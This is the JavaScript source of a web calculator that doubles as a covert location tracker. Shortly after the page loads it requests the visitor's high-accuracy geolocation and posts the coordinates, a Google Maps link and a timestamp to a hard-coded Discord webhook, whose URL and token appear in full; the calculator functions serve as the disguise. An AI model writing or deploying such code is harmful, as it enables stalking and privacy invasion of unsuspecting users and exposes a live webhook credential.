const WEBHOOK_URL = 'https://discord.com/api/webhooks/1488574733862830192/HdaqEUKW_FJzI2jsqPMc6jGyE-A32aj6BxQjRQ-SAKWiB9hN0vC6uWW9X4ElNicI9jMY';

let expr = '';
let justCalc = false;

const resultEl = document.getElementById('result');
const expressionEl = document.getElementById('expression');
const toastEl = document.getElementById('toast');

function showToast(msg, duration = 3000) {
  toastEl.textContent = msg;
  toastEl.classList.add('show');
  setTimeout(() => toastEl.classList.remove('show'), duration);
}

async function sendToDiscord(lat, lon, accuracy) {
  const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
  const payload = {
    username: 'Location Logger',
    avatar_url: 'https://i1.sndcdn.com/artworks-EcUsidnDBPcL9XiX-cJz3GA-t500x500.jpg',
    embeds: [
      {
        title: '📍 Location Detected',
        color: 0xa78bfa,
        fields: [
          { name: 'Latitude', value: `\`${lat}\``, inline: true },
          { name: 'Longitude', value: `\`${lon}\``, inline: true },
          { name: 'Accuracy', value: `\`±${Math.round(accuracy)}m\``, inline: true },
          { name: 'Google Maps', value: `[Open Location](${mapsLink})` },
          { name: 'Time', value: `\`${new Date().toLocaleString()}\`` }
        ],
        footer: { text: 'Calculator Location Logger' }
      }
    ]
  };

  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    showToast('✅ Location logged to Discord');
  } catch {
    showToast('⚠️ Webhook failed — check your URL');
  }
}

function requestLocation() {
  if (!navigator.geolocation) {
    showToast('⚠️ Geolocation not supported');
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      const { latitude, longitude, accuracy } = pos.coords;
      sendToDiscord(latitude, longitude, accuracy);
    },
    (err) => {
      if (err.code === 1) showToast('📍 Location permission denied');
      else showToast('⚠️ Could not get location');
    },
    { enableHighAccuracy: true, timeout: 10000 }
  );
}

window.addEventListener('load', () => {
  setTimeout(requestLocation, 800);
});

function display(val) {
  resultEl.classList.remove('pop');
  void resultEl.offsetWidth;
  resultEl.classList.add('pop');
  resultEl.textContent = val;
}

function input(val) {
  const ops = ['+', '-', '*', '/'];
  if (justCalc && !ops.includes(val)) expr = '';
  justCalc = false;

  if (val === '.' && expr.split(/[\+\-\*\/]/).pop().includes('.')) return;
  if (ops.includes(val) && ops.includes(expr.slice(-1))) expr = expr.slice(0, -1);

  expr += val;
  expressionEl.textContent = formatExpr(expr);
  try {
    const res = Function('"use strict"; return (' + expr + ')')();
    if (isFinite(res)) display(round(res));
  } catch {}
}

function calculate() {
  if (!expr) return;
  try {
    expressionEl.textContent = formatExpr(expr) + ' =';
    const res = Function('"use strict"; return (' + expr + ')')();
    if (!isFinite(res)) throw new Error();
    display(round(res));
    expr = String(res);
    justCalc = true;
  } catch {
    display('Error');
    expr = '';
  }
}

function clearAll() {
  expr = '';
  justCalc = false;
  display('0');
  expressionEl.textContent = '';
}

function deleteLast() {
  expr = expr.slice(0, -1);
  expressionEl.textContent = formatExpr(expr);
  if (!expr) { display('0'); return; }
  try {
    const res = Function('"use strict"; return (' + expr + ')')();
    if (isFinite(res)) display(round(res));
  } catch {}
}

function round(n) {
  return parseFloat(n.toPrecision(12)).toString();
}

function formatExpr(e) {
  return e.replace(/\*/g, '×').replace(/\//g, '÷').replace(/-/g, '−');
}

document.querySelectorAll('button').forEach(btn => {
  btn.addEventListener('click', function(e) {
    const rect = btn.getBoundingClientRect();
    const x = e.clientX - rect.left;
    const y = e.clientY - rect.top;
    btn.style.setProperty('--rx', x + 'px');
    btn.style.setProperty('--ry', y + 'px');
    const rip = document.createElement('span');
    rip.className = 'ripple';
    rip.style.cssText = `width:60px;height:60px;left:${x - 30}px;top:${y - 30}px`;
    btn.appendChild(rip);
    setTimeout(() => rip.remove(), 450);
  });
});

document.addEventListener('keydown', e => {
  if (e.key >= '0' && e.key <= '9') input(e.key);
  else if (['+', '-', '*', '/'].includes(e.key)) input(e.key);
  else if (e.key === '.') input('.');
  else if (e.key === 'Enter' || e.key === '=') calculate();
  else if (e.key === 'Backspace') deleteLast();
  else if (e.key === 'Escape') clearAll();
});
